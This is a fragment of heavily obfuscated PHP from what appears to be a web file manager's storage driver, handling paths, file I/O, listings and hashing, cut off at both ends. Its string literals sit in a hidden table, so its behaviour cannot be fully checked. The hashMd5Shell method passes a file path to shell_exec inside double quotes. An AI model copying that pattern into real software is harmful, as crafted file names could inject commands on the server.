setContent($Eëƒ£ç’‹, $cäç¦‹‰ö = '') { $Eëƒ£ç’‹ = $this->iconvSystem($Eëƒ£ç’‹); $Bø´‚·¹ = @file_put_contents($Eëƒ£ç’‹, $cäç¦‹‰ö, LOCK_EX); clearstatcache(); @chmod($Eëƒ£ç’‹, $this->pathAuth); return $Bø´‚·¹ === !1 ? !1 : !0; } public function fileSubstr($bÓŞ›Ãï§õ, $f¬“ÈÜÔÉ = 0, $Cˆ©‘®–ÃÛ = false) { goto A¤Ñ¼×Š›; cµ‚§¥˜Ù: fseek_64($D„É‹Ş‹, $f¬“ÈÜÔÉ); $b„öŸîŞ’ = fread($D„É‹Ş‹, $Cˆ©‘®–ÃÛ); fclose($D„É‹Ş‹); goto E‘ŒìåÏ¤; A¤Ñ¼×Š›: $dªì¯›İ‰‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÓŞ›Ãï§õ = $this->iconvSystem($bÓŞ›Ãï§õ); if ($Cˆ©‘®–ÃÛ === !1) { $Cˆ©‘®–ÃÛ = $this->size($bÓŞ›Ãï§õ); } goto DÂ»ö©ÑªÛ; DÂ»ö©ÑªÛ: if ($Cˆ©‘®–ÃÛ <= 0) { return $dªì¯›İ‰‘[33]; } $D„É‹Ş‹ = fopen($bÓŞ›Ãï§õ, $dªì¯›İ‰‘[1280]); if (!$D„É‹Ş‹) { return !1; } goto cµ‚§¥˜Ù; E‘ŒìåÏ¤: return $b„öŸîŞ’; goto cÆË„—ÂºÀ; cÆË„—ÂºÀ: } public function upload($f—¥ÂëÂÚÇ, $dõá¶­±±æ, $dÆé‚ä¸›ó = false, $AŠÆ÷‚˜¶ = REPEAT_REPLACE) { if ($dÆé‚ä¸›ó) { return $this->moveFile($dõá¶­±±æ, $f—¥ÂëÂÚÇ); } return $this->copyFile($dõá¶­±±æ, $f—¥ÂëÂÚÇ); } public function setModifyTime($d‡Ê‰˜ô¦½, $E¿ËÄºÚ¢ò = '') { @touch($d‡Ê‰˜ô¦½, intval($E¿ËÄºÚ¢ò)); } public function download($EÅ‘ßÖ¡Òï, $d¤Ã”İğŞ) { return $this->iconvSystem($EÅ‘ßÖ¡Òï); } } goto aå–î†¸›Û; BÁ©‰¼¶¨¹: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $cÏø¯Ù†± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->objectDriver = array($cÏø¯Ù†±[57], $cÏø¯Ù†±[58], $cÏø¯Ù†±[59], $cÏø¯Ù†±[60], $cÏø¯Ù†±[61], $cÏø¯Ù†±[62], $cÏø¯Ù†±[63], $cÏø¯Ù†±[64], $cÏø¯Ù†±[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($d‘‘ß»ùÄÚ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($d‘‘ß»ùÄÚ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][8]); } return $d‘‘ß»ùÄÚ; } public function iconvApp($cè·ƒ¯ÃÚ¬) { return $cè·ƒ¯ÃÚ¬; } public function iconvSystem($d“§…Òì¦) { return $d“§…Òì¦; } public function iconvTo($A¥‡É›ªÍá, $bÛµùÕïÚ¹, $a«›œ‹¹¡) { goto bõ•‚·‹åì; f•—»¹Î´î: return $bÒ˜»„Ä„Ñ; goto CŞœòğ²„è; AœÊÁœë»: $bÒ˜»„Ä„Ñ = $bÒ˜»„Ä„Ñ ? $bÒ˜»„Ä„Ñ : $A¥‡É›ªÍá; if (strstr($bÒ˜»„Ä„Ñ, $f»½õÔæ¯ï[70])) { $bÒ˜»„Ä„Ñ = str_replace($f»½õÔæ¯ï[70], $f»½õÔæ¯ï[71], $bÒ˜»„Ä„Ñ); } $C«íšÄâ[$bÛµùÕïÚ¹ . $f»½õÔæ¯ï[67] . $a«›œ‹¹¡ . $f»½õÔæ¯ï[68] . $A¥‡É›ªÍá] = $bÒ˜»„Ä„Ñ; goto b·µ·µê©¹; b·µ·µê©¹: $C«íšÄâ[$a«›œ‹¹¡ . $f»½õÔæ¯ï[67] . $bÛµùÕïÚ¹ . $f»½õÔæ¯ï[68] . $A¥‡É›ªÍá] = $A¥‡É›ªÍá; $C«íšÄâ[$a«›œ‹¹¡ . $f»½õÔæ¯ï[67] . $bÛµùÕïÚ¹ . $f»½õÔæ¯ï[68] . $bÒ˜»„Ä„Ñ] = $A¥‡É›ªÍá; $C«íšÄâ[$bÛµùÕïÚ¹ . $f»½õÔæ¯ï[67] . $a«›œ‹¹¡ . $f»½õÔæ¯ï[68] . $bÒ˜»„Ä„Ñ] = $bÒ˜»„Ä„Ñ; goto f•—»¹Î´î; e¤×‰ÊŒØÈ: $fÇ ¥£ïš = $bÛµùÕïÚ¹ . $f»½õÔæ¯ï[67] . $a«›œ‹¹¡ . $f»½õÔæ¯ï[68] . $A¥‡É›ªÍá; if (isset($C«íšÄâ[$fÇ ¥£ïš])) { return $C«íšÄâ[$fÇ ¥£ïš]; } if (function_exists($f»½õÔæ¯ï[69])) { $bÒ˜»„Ä„Ñ = @mb_convert_encoding($A¥‡É›ªÍá, $a«›œ‹¹¡, $bÛµùÕïÚ¹); } else { $bÒ˜»„Ä„Ñ = @iconv($bÛµùÕïÚ¹, $a«›œ‹¹¡, $A¥‡É›ªÍá); } goto AœÊÁœë»; bõ•‚·‹åì: $f»½õÔæ¯ï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$A¥‡É›ªÍá || !function_exists($f»½õÔæ¯ï[66])) { return $A¥‡É›ªÍá; } static $C«íšÄâ = array(); goto e¤×‰ÊŒØÈ; CŞœòğ²„è: } public function getPathInner($cÔœ™İ¦‹Ñ) { $dñ«´ğ¦ = IO::init($cÔœ™İ¦‹Ñ); return $dñ«´ğ¦->path; } public function getPathOuter($C‚Æ³ä–Ó) { $c¬ŒˆË²»Ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÄè•ä£ = strlen(trim($this->pathBase, $c¬ŒˆË²»Ó[8])); $C‚Æ³ä–Ó = substr(trim($C‚Æ³ä–Ó, $c¬ŒˆË²»Ó[8]), $eÄè•ä£); return $this->pathDriver . $c¬ŒˆË²»Ó[8] . ltrim($C‚Æ³ä–Ó, $c¬ŒˆË²»Ó[8]); } public function isParentOf($dÎÔ”øê°®, $AÅ«ò•£…) { $DÉŸÏÏìµÈ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÎÔ”øê°® = rtrim(strtolower($dÎÔ”øê°®), $DÉŸÏÏìµÈ[8]) . $DÉŸÏÏìµÈ[8]; $AÅ«ò•£… = rtrim(strtolower($AÅ«ò•£…), $DÉŸÏÏìµÈ[8]) . $DÉŸÏÏìµÈ[8]; $DßºÂ½ƒ› = strpos($AÅ«ò•£…, $dÎÔ”øê°®) === 0; return $DßºÂ½ƒ›; } public function getType() { $AîåŠĞ¿Ê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BŠ±Âô¡ğ = str_replace($AîåŠĞ¿Ê[72], $AîåŠĞ¿Ê[33], get_class($this)); return strtolower($BŠ±Âô¡ğ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($e´ŠÇ×ÕÆŒ, $bš”ë¸ªÕ°) { $cĞà¡·³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÕÙ³˜Í® = rtrim($e´ŠÇ×ÕÆŒ, $cĞà¡·³[8]) . $cĞà¡·³[8] . $bš”ë¸ªÕ°; $b·Ï´™ª¤¿ = $this->exist($DÕÙ³˜Í®); return $b·Ï´™ª¤¿ ? $DÕÙ³˜Í® : !1; } public function setModifyTime($a©š—„ä¶º, $D™¢ƒ¿Š‡Ğ = '') { } public function renameObject($CÊóÈöÍ, $bîİˆ½ßê) { goto aĞğ¸ùô”±; aĞğ¸ùô”±: $díÑ‹ÈÂ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÛÎ±ØÔÄ‘ = $bîİˆ½ßê; Hook::trigger($díÑ‹ÈÂ[73], $this, $CÊóÈöÍ, $this, $this->pathFather($CÊóÈöÍ) . $bîİˆ½ßê); goto D·¢™ÚòÌ; D·¢™ÚòÌ: $CÊóÈöÍ = $this->getPathOuter($CÊóÈöÍ); $bîİˆ½ßê = $this->pathFather($CÊóÈöÍ) . $bîİˆ½ßê; if (IO::isFile($CÊóÈöÍ)) { $fåà·Û·â“ = IO::copy($CÊóÈöÍ, $this->pathFather($CÊóÈöÍ), REPEAT_RENAME_FOLDER, $AÛÎ±ØÔÄ‘); if ($fåà·Û·â“) { IO::remove($CÊóÈöÍ); } } else { $fåà·Û·â“ = IO::mkdir($bîİˆ½ßê); if (!$fåà·Û·â“) { return !1; } $bÁÕÆÕ£ = IO::listPath($CÊóÈöÍ, !0); $EÇæØÊ¦¨‚ = array_merge($bÁÕÆÕ£[$díÑ‹ÈÂ[74]], $bÁÕÆÕ£[$díÑ‹ÈÂ[75]]); foreach ($EÇæØÊ¦¨‚ as $c¯¾µš­Ëã) { IO::move($c¯¾µš­Ëã[$díÑ‹ÈÂ[76]], $bîİˆ½ßê, REPEAT_RENAME_FOLDER); } IO::remove($CÊóÈöÍ); } goto cíàïˆÓŸ; cíàïˆÓŸ: return $fåà·Û·â“ ? $bîİˆ½ßê : !1; goto C²šÎÕ›ö; C²šÎÕ›ö: } public function tempFile($f‹§ÑÄ³«Ÿ = '', $F¿¬Ûï˜ÊÛ = '') { goto aŠ‘éÎ¨ää; fùÈÖ¼´Èà: return $Cæ™—çª¿ê; goto cê¯†´ÎŸñ; aŠ‘éÎ¨ää: if (!$f‹§ÑÄ³«Ÿ) { $f‹§ÑÄ³«Ÿ = rand_string(15); } $fĞáÇá°Ñ = TEMP_FILES . rand_string(15) . $_SERVER[Ôğ—¤Šµˆ˜ñ£][8]; @mkdir($fĞáÇá°Ñ, DEFAULT_PERRMISSIONS, !0); goto Eª¦ÑÜ„Ãš; Eª¦ÑÜ„Ãš: $Cæ™—çª¿ê = $fĞáÇá°Ñ . $f‹§ÑÄ³«Ÿ; @touch($Cæ™—çª¿ê); if ($F¿¬Ûï˜ÊÛ) { file_put_contents($Cæ™—çª¿ê, $F¿¬Ûï˜ÊÛ); } goto fùÈÖ¼´Èà; cê¯†´ÎŸñ: } public function tempFileRemve($eÓäÇ®ñÀ) { @unlink($eÓäÇ®ñÀ); @rmdir($this->pathFather($eÓäÇ®ñÀ)); } public function mkfile($eÆ«ß›, $A¤»îÓ½œö = '', $BÑ¤©èî = REPEAT_RENAME) { } public function mkdir($d’áÁ²›‡¹, $d‰¿ÌÆ–¸ = REPEAT_SKIP) { } public function delFile($A×âŞ£èÉ) { } public function delFolder($dº”à«Í…—) { } public function copyFile($E°‹…¤Ù½Ó, $eÛğ¥Š¦š®) { } public function moveFile($Dá˜Ö”Ã, $A¼ºëÀßÈ) { } public function remove($D´î²‚„Ã±) { if ($this->isFile($D´î²‚„Ã±)) { return $this->delFile($D´î²‚„Ã±); } return $this->delFolder($D´î²‚„Ã±); } public function rename($c¿¥Ø´ÜèÊ, $D¿ÌßåñÕÍ) { } public function exist($Cªµ›Û¤â±) { } public function findByHash($c’õã—™ô = '', $eò±Îëâ¾ñ = '') { return !1; } public function isFile($cŸÛœ™Ï¨¯) { } public function isFolder($a“õ¢ñâå) { } public function size($b¡»ˆ°³Ñ) { } public function info($d‚‹¯ÁÅá) { } public function infoSimple($b´‹¸†‡¯‹) { return $this->info($b´‹¸†‡¯‹); } public function infoAuth($DŸğÈá¨ƒ‹) { return $this->info($DŸğÈá¨ƒ‹); } public function infoFull($e¥Â¾¸×¡) { return $this->info($e¥Â¾¸×¡); } public function infoWithChildren($d†Ÿ„§­†ñ) { $aÏ‡ï¼¯Ã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $dğô±øŠ¤– = array(); if (isset($dğô±øŠ¤–[$d†Ÿ„§­†ñ])) { return $dğô±øŠ¤–[$d†Ÿ„§­†ñ]; } $dÔ’æ†’Ê– = $this->info($d†Ÿ„§­†ñ); if ($dÔ’æ†’Ê– && $dÔ’æ†’Ê–[$aÏ‡ï¼¯Ã[29]] == $aÏ‡ï¼¯Ã[77]) { $aÚÎ‚ØÜ¥Ò = array($aÏ‡ï¼¯Ã[78] => 0, $aÏ‡ï¼¯Ã[79] => 0, $aÏ‡ï¼¯Ã[80] => 0); $this->infoChildren($d†Ÿ„§­†ñ, $aÚÎ‚ØÜ¥Ò); $dÔ’æ†’Ê–[$aÏ‡ï¼¯Ã[78]] = $aÚÎ‚ØÜ¥Ò[$aÏ‡ï¼¯Ã[78]]; $dÔ’æ†’Ê–[$aÏ‡ï¼¯Ã[81]] = array($aÏ‡ï¼¯Ã[82] => $aÚÎ‚ØÜ¥Ò[$aÏ‡ï¼¯Ã[79]], $aÏ‡ï¼¯Ã[83] => $aÚÎ‚ØÜ¥Ò[$aÏ‡ï¼¯Ã[80]]); $dğô±øŠ¤–[$d†Ÿ„§­†ñ] = $dÔ’æ†’Ê–; } return $dÔ’æ†’Ê–; } public function listPath($aá¨àÌ”¦, $fÆ¼‘œÀá¡ = false) { } public function has($eãÈª½”ô×, $D†ÄãíßìÑ = false, $b—º¨©…ãĞ = false) { } public function canRead($D©²İ”ñ£Ò) { } public function canWrite($D°–×¨æ‰Ñ) { } public function getContent($bˆäºö) { } public function setContent($FÛëÅ»Š»“, $fŒß‡Í¿áÕ = '') { } protected function infoChildren($Dƒ¶ƒÃâó, &$cíÍ£ÖÏ›î) { $aÔ‹»ä†Ûë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; check_abort_echo(); $A´´™Å‘®“ = $this->listPath($Dƒ¶ƒÃâó, !0); $A´´™Å‘®“ = array_merge($A´´™Å‘®“[$aÔ‹»ä†Ûë[75]], $A´´™Å‘®“[$aÔ‹»ä†Ûë[74]]); foreach ($A´´™Å‘®“ as $Cƒ êÚ…) { if ($Cƒ êÚ…[$aÔ‹»ä†Ûë[29]] == $aÔ‹»ä†Ûë[77]) { $cíÍ£ÖÏ›î[$aÔ‹»ä†Ûë[80]]++; $EÚ£‚ï§  = $this->getPathInner($Cƒ êÚ…[$aÔ‹»ä†Ûë[76]]); $this->infoChildren($EÚ£‚ï§ , $cíÍ£ÖÏ›î); } else { $cíÍ£ÖÏ›î[$aÔ‹»ä†Ûë[79]]++; $cíÍ£ÖÏ›î[$aÔ‹»ä†Ûë[78]] += $Cƒ êÚ…[$aÔ‹»ä†Ûë[78]]; } } } public function fileSubstr($dÌŞä”±í , $e…˜ÂñºÅ, $d‹õ¡µ‡»Œ) { } public function listAll($d”ÖªŒõ¦ê) { } public function listAllMake($b°÷ˆ¥Û¬¹, &$EÂ«¤ñ¤Œ¸) { $fò®‚ˆâ‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; check_abort_echo(); $e¨ àğŞê = $this->listPath($b°÷ˆ¥Û¬¹, !0); if (!$e¨ àğŞê) { return; } $Fõ×Æ­õÖ = array_merge($e¨ àğŞê[$fò®‚ˆâ‹[75]], $e¨ àğŞê[$fò®‚ˆâ‹[74]]); foreach ($Fõ×Æ­õÖ as $aƒî™Ì³˜À) { goto Eì«‹ôŞÀ•; EŒ×òßß‰·: $this->listAllMake($aƒî™Ì³˜À[$fò®‚ˆâ‹[76]], $EÂ«¤ñ¤Œ¸); goto b§²å…¤…; Eì«‹ôŞÀ•: $eæƒ¯­ñ´ = $aƒî™Ì³˜À[$fò®‚ˆâ‹[29]] == $fò®‚ˆâ‹[77]; $D†‘°¤Á¦İ = array($fò®‚ˆâ‹[76] => $aƒî™Ì³˜À[$fò®‚ˆâ‹[76]], $fò®‚ˆâ‹[77] => $eæƒ¯­ñ´); if (isset($aƒî™Ì³˜À[$fò®‚ˆâ‹[78]])) { $D†‘°¤Á¦İ[$fò®‚ˆâ‹[78]] = $aƒî™Ì³˜À[$fò®‚ˆâ‹[78]]; } goto dÄ¥¢íàã÷; dÄ¥¢íàã÷: if (isset($aƒî™Ì³˜À[$fò®‚ˆâ‹[84]])) { $D†‘°¤Á¦İ[$fò®‚ˆâ‹[84]] = $aƒî™Ì³˜À[$fò®‚ˆâ‹[84]]; } if (!$eæƒ¯­ñ´) { $EÂ«¤ñ¤Œ¸[] = $D†‘°¤Á¦İ; continue; } $EÂ«¤ñ¤Œ¸[] = $D†‘°¤Á¦İ; goto EŒ×òßß‰·; b§²å…¤…: } } public function listAllSimple($Dß„Äè›Ó) { $E°êÂÊ†Š‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¹Êº¯±Üõ = array(); $D£Öâù¿ÎÃ = $this->listAll($Dß„Äè›Ó); $Bƒ…Ø…ëöğ = $this->getPathOuter($Dß„Äè›Ó); foreach ($D£Öâù¿ÎÃ as $A‘…¿­§å) { goto B‡ÉÏ‡•¿; F¶Ö¸Œ¢§Ç: $AŞÌ‡ƒ¶˜´ = array($E°êÂÊ†Š‘[76] => $Bç›²àÊÉ‰, $E°êÂÊ†Š‘[77] => $A‘…¿­§å[$E°êÂÊ†Š‘[77]]); if (isset($A‘…¿­§å[$E°êÂÊ†Š‘[78]]) && !$A‘…¿­§å[$E°êÂÊ†Š‘[77]]) { $AŞÌ‡ƒ¶˜´[$E°êÂÊ†Š‘[78]] = $A‘…¿­§å[$E°êÂÊ†Š‘[78]]; } if (isset($A‘…¿­§å[$E°êÂÊ†Š‘[84]])) { $AŞÌ‡ƒ¶˜´[$E°êÂÊ†Š‘[84]] = $A‘…¿­§å[$E°êÂÊ†Š‘[84]]; } goto DÇº‘‚à•Í; B‡ÉÏ‡•¿: $aµ¨ÔĞà— = $A‘…¿­§å[$E°êÂÊ†Š‘[76]]; $Bç›²àÊÉ‰ = $A‘…¿­§å[$E°êÂÊ†Š‘[76]]; if (isset($A‘…¿­§å[$E°êÂÊ†Š‘[85]])) { $aµ¨ÔĞà— = $A‘…¿­§å[$E°êÂÊ†Š‘[85]][$E°êÂÊ†Š‘[76]]; $A‘…¿­§å[$E°êÂÊ†Š‘[78]] = $A‘…¿­§å[$E°êÂÊ†Š‘[85]][$E°êÂÊ†Š‘[78]]; $A‘…¿­§å[$E°êÂÊ†Š‘[84]] = $A‘…¿­§å[$E°êÂÊ†Š‘[85]][$E°êÂÊ†Š‘[84]]; } else { $Bç›²àÊÉ‰ = substr($A‘…¿­§å[$E°êÂÊ†Š‘[76]], strlen(get_path_father($Bƒ…Ø…ëöğ))); $Bç›²àÊÉ‰ = $E°êÂÊ†Š‘[8] . ltrim($Bç›²àÊÉ‰, $E°êÂÊ†Š‘[8]); } goto F¶Ö¸Œ¢§Ç; DÇº‘‚à•Í: if (!$A‘…¿­§å[$E°êÂÊ†Š‘[77]]) { $AŞÌ‡ƒ¶˜´[$E°êÂÊ†Š‘[86]] = $aµ¨ÔĞà—; } $a¹Êº¯±Üõ[] = $AŞÌ‡ƒ¶˜´; goto aƒê¢¦¡ä; aƒê¢¦¡ä: } return $a¹Êº¯±Üõ; } public function upload($CÊŠ÷ë©£â, $c‡–Ÿæ ¡¹, $E—‚¸¢â´“ = false, $b„ĞÒ±åæ = REPEAT_REPLACE) { } public function uploadFileByID($EÄ¼íµ¤ë‰, $Cí¬†Ä°ãà, $d¥èÛà…ò) { } public function uploadFileByPath($B‘ŸòÖ£ù‚, $e¹²Åˆ¡ŸÈ, $cõÅ¿¿§ˆ = array()) { } public function isUploadServer() { $F¿·±–ôíÓ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $F¿·±–ôíÓ[87]) { return !0; } return $GLOBALS[$F¿·±–ôíÓ[6]][$F¿·±–ôíÓ[88]][$F¿·±–ôíÓ[89]]; } public function isFileOutServer() { $eƒ…¾ùö‚¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $eƒ…¾ùö‚¼[87]) { return !0; } return $GLOBALS[$eƒ…¾ùö‚¼[6]][$eƒ…¾ùö‚¼[88]][$eƒ…¾ùö‚¼[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($F£áÏ›ä¸œ) { $BÇßÆ›æ”¬ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->isCdnHost()) { return $F£áÏ›ä¸œ; } return str_replace(trim(get_url_root($F£áÏ›ä¸œ), $BÇßÆ›æ”¬[8]), trim($this->cdnHost, $BÇßÆ›æ”¬[8]), $F£áÏ›ä¸œ); } public function uploadLink($A¸’Á”Ïëµ, $Eæ¬ÌÆ›°Ö = 0) { goto dˆ¾Ğ¶Ä§¡; dˆ¾Ğ¶Ä§¡: $CåÃèÌ±Úª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->isUploadServer()) { return; } $CÍ¸÷Ş†‚ø = $this->getType(); goto fÁ°¼Íæ£É; fÁ°¼Íæ£É: if (!in_array($CÍ¸÷Ş†‚ø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $D¯·­“©•¤ = 1024 * 1024 * 10; goto f‘Ì„¾Ëè‡; B¥ŞË…½•™: if ($cöÆ«õ©©) { $cöÆ«õ©©[$CåÃèÌ±Úª[93]] = $A¸’Á”Ïëµ; $cöÆ«õ©©[$CåÃèÌ±Úª[94]] = $CÍ¸÷Ş†‚ø; } return $cöÆ«õ©©; goto A»ˆ†àƒ; f‘Ì„¾Ëè‡: $b‚Ğ¸Äôå” = $Eæ¬ÌÆ›°Ö <= $D¯·­“©•¤ ? $CåÃèÌ±Úª[91] : $CåÃèÌ±Úª[92]; $C°‘ßÅæ¼Û = (!$Eæ¬ÌÆ›°Ö ? 1 : ceil($Eæ¬ÌÆ›°Ö / pow(1024, 3))) * 3600 * 4; $cöÆ«õ©© = $this->{$b‚Ğ¸Äôå”}($A¸’Á”Ïëµ, $C°‘ßÅæ¼Û); goto B¥ŞË…½•™; A»ˆ†àƒ: } public function uploadFormData($f‹ÈÚ¢‹Í, $A‘ÜŠ¼«¡ = 3600) { } public function multiUploadFormData($EÕâšòìÌô, $bÉƒµ´õá± = 3600) { } public function download($EˆÃ©øÀ‚, $Dø¡—°’ŞŠ) { } public function ext($AÏ¯†°¦‚œ) { $fÓî­¢‹£Ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (strpos($AÏ¯†°¦‚œ, $fÓî­¢‹£Ì[8]) === -1) { $e“‡¯Ú±¥ = $AÏ¯†°¦‚œ; } else { $e“‡¯Ú±¥ = $this->pathThis($AÏ¯†°¦‚œ); } $b¾Ï“„Ğ§ = $fÓî­¢‹£Ì[33]; if (strstr($e“‡¯Ú±¥, $fÓî­¢‹£Ì[95])) { $b¾Ï“„Ğ§ = substr($e“‡¯Ú±¥, strrpos($e“‡¯Ú±¥, $fÓî­¢‹£Ì[95]) + 1); $b¾Ï“„Ğ§ = strtolower($b¾Ï“„Ğ§); } if (strlen($b¾Ï“„Ğ§) > 3 && preg_match($fÓî­¢‹£Ì[96], $b¾Ï“„Ğ§, $F›¨±–Á…²)) { $b¾Ï“„Ğ§ = $fÓî­¢‹£Ì[33]; } return $b¾Ï“„Ğ§; } public function pathThis($B®¨Ÿ ˆäÅ) { $c¸½¾åÆì› =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B®¨Ÿ ˆäÅ = str_replace($c¸½¾åÆì›[97], $c¸½¾åÆì›[8], rtrim($B®¨Ÿ ˆäÅ, $c¸½¾åÆì›[8])); $f˜ÉÊÖÊºå = strrpos($B®¨Ÿ ˆäÅ, $c¸½¾åÆì›[8]); if ($f˜ÉÊÖÊºå === !1) { return $B®¨Ÿ ˆäÅ; } return substr($B®¨Ÿ ˆäÅ, $f˜ÉÊÖÊºå + 1); } public function pathFather($bÏİ¥É¤Àƒ) { $cÌÆ©Ó¸öĞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÏİ¥É¤Àƒ = str_replace($cÌÆ©Ó¸öĞ[97], $cÌÆ©Ó¸öĞ[8], rtrim($bÏİ¥É¤Àƒ, $cÌÆ©Ó¸öĞ[8])); $b®×ôÚİ¢½ = strrpos($bÏİ¥É¤Àƒ, $cÌÆ©Ó¸öĞ[8]); if ($b®×ôÚİ¢½ === !1) { return $cÌÆ©Ó¸öĞ[33]; } return substr($bÏİ¥É¤Àƒ, 0, $b®×ôÚİ¢½ + 1); } public function hashSimple($d¬Šğâ‹…ë) { goto d…ÃÑÅ’°; C²Åšî‹êÒ: $DŒ÷©ÉÅ¥Ó .= $this->fileSubstr($d¬Šğâ‹…ë, $d©á…£ÜŠ« - $fŠÏÑÑ©óİ, $fŠÏÑÑ©óİ); return md5($DŒ÷©ÉÅ¥Ó) . $d©á…£ÜŠ«; goto bÅ½§åÍÇ©; bˆ¯Ú„Â‘İ: $a¥Ø¡—• = intval($d©á…£ÜŠ« / $b÷ÉœÍÚ‡á); $DŒ÷©ÉÅ¥Ó = $FÕŞ©öÅÕØ[33]; for ($C®´®Ì¢ÖÍ = 0; $C®´®Ì¢ÖÍ < $b÷ÉœÍÚ‡á; $C®´®Ì¢ÖÍ++) { $DŒ÷©ÉÅ¥Ó .= $this->fileSubstr($d¬Šğâ‹…ë, $a¥Ø¡—• * $C®´®Ì¢ÖÍ, $fŠÏÑÑ©óİ); } goto C²Åšî‹êÒ; d…ÃÑÅ’°: $FÕŞ©öÅÕØ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$d¬Šğâ‹…ë) { return md5($FÕŞ©öÅÕØ[33]); } $d©á…£ÜŠ« = $this->size($d¬Šğâ‹…ë); goto C™Âïº”ºÂ; C™Âïº”ºÂ: $fŠÏÑÑ©óİ = 200; $b÷ÉœÍÚ‡á = 50; if ($d©á…£ÜŠ« <= $fŠÏÑÑ©óİ * $b÷ÉœÍÚ‡á) { return $this->hashMd5($d¬Šğâ‹…ë) . $d©á…£ÜŠ«; } goto bˆ¯Ú„Â‘İ; bÅ½§åÍÇ©: } public static $md5Cache = array(); public function hashMd5($B‹‰©äÔºá) { $B‹‰©äÔºá = $this->iconvSystem($B‹‰©äÔºá); if (isset(self::$md5Cache[$B‹‰©äÔºá])) { return self::$md5Cache[$B‹‰©äÔºá]; } self::$md5Cache[$B‹‰©äÔºá] = $this->hashMd5Shell($B‹‰©äÔºá); if (!self::$md5Cache[$B‹‰©äÔºá]) { self::$md5Cache[$B‹‰©äÔºá] = @md5_file($B‹‰©äÔºá); } return self::$md5Cache[$B‹‰©äÔºá]; } private function hashMd5Shell($b­Ñ²æŠğ½) { goto b—ƒÒÍ‰‹ù; D˜®È×š˜: $b—ô×İĞ„ö = Cache::get($cìª´êêƒ[101]); if (!$b—ô×İĞ„ö) { $c£ã·ï‹Â‹ = BASIC_PATH . $cìª´êêƒ[102]; $e¯œâ£‘º = md5_file($c£ã·ï‹Â‹); $b—ô×İĞ„ö = $cìª´êêƒ[103]; foreach ($aØÂƒ­±Îø as $cÔØ§ˆùÀ”) { $A‡’µšï‹ = shell_exec($cÔØ§ˆùÀ” . "\40\x22{$c£ã·ï‹Â‹}\x22"); if ($A‡’µšï‹ && substr(trim($A‡’µšï‹), 0, 32) == $e¯œâ£‘º) { $b—ô×İĞ„ö = $cÔØ§ˆùÀ”; break; } } Cache::set($cìª´êêƒ[101], $b—ô×İĞ„ö, 3600); } if ($b—ô×İĞ„ö == $cìª´êêƒ[103]) { return !1; } goto D©ã……çØƒ; D©ã……çØƒ: $A‡’µšï‹ = shell_exec($b—ô×İĞ„ö . "\x20\x22{$b­Ñ²æŠğ½}\42"); $A‡’µšï‹ = str_replace($cìª´êêƒ[104], $cìª´êêƒ[33], $A‡’µšï‹); return substr($A‡’µšï‹, 0, 32); goto e„ˆÃÁÅÉ; b—ƒÒÍ‰‹ù: $cìª´êêƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!function_exists($cìª´êêƒ[98])) { return !1; } $aØÂƒ­±Îø = array($cìª´êêƒ[99], $cìª´êêƒ[100]); goto D˜®È×š˜; e„ˆÃÁÅÉ: } public function link($Bæ®Õó¢‘‡) { return $Bæ®Õó¢‘‡; } public function fileOut($BƒŠœà”°Ò, $Cõ¿äñèê = false, $FæˆâØ£À· = false, $fŸ•¢³óÛÔ = '') { goto A‰‰“´á¸; AééÙ†ÅÃõ: $b‡¤ÕË°ª = !0; if ($_SERVER[$fŞø—ßÑÕ[154]] == $fŞø—ßÑÕ[155] && $a…—’÷‰œ´ > 1204 * 1024 * 1024 * 2) { $b‡¤ÕË°ª = !1; } if ($b‡¤ÕË°ª) { header($fŞø—ßÑÕ[156] . ($EÕÒšÄ×±Ù - $dèÅÔ¢ó‚‘ + 1)); } goto dÓ³Æ…·Ü; Bò†ŒœÊó: @ob_end_clean(); set_timeout(); $dë–¹Ñå· = $this->infoFull($BƒŠœà”°Ò); goto AË†Õê«¶¢; dÓ³Æ…·Ü: if ($_SERVER[$fŞø—ßÑÕ[157]] == $fŞø—ßÑÕ[158]) { return; } $aóµ¿å±®° = 1024 * 100; $fµ°ø¦¡ÂÆ = 0; goto D÷ÎÜ™³¶ˆ; F¢â§¦³ªŒ: if (isset($_SERVER[$fŞø—ßÑÕ[131]]) && strtotime($_SERVER[$fŞø—ßÑÕ[131]]) == $dë–¹Ñå·[$fŞø—ßÑÕ[84]]) { header($fŞø—ßÑÕ[132], !0, 304); die; } if (isset($_SERVER[$fŞø—ßÑÕ[133]]) && $_SERVER[$fŞø—ßÑÕ[133]] == $fŸ•¢³óÛÔ) { header($fŞø—ßÑÕ[134] . $fŸ•¢³óÛÔ, !0, 304); die; } header($fŞø—ßÑÕ[134] . $fŸ•¢³óÛÔ); goto d 